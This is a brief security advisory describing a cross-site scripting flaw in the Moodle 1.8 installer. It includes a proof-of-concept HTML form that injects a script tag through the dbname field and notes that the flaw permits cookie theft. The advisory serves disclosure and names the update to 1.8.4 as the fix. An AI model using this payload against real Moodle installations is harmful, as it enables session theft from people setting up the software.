Description
Moodle is a course management system for educators.
 The installer code is vulnerable to Cross Site Scripting, letting you inject 
JavaScript and steal cookies. The XSS can only be triggered if there's a not 
installed moodle, so this can be considered low impact. Still it's possible 
to attack if an attacker knows from another person installing moodle. 

Sample code
Sample XSS code:
<form method="post" action="http://localhost/moodle/install.php">
<input type="hidden" name="stage" value="3">
<input type="text" name="dbname" value='"><script>alert(1)</script>'>
<input type=submit>
</form>

Workaround/Fix
Update to 1.8.4.
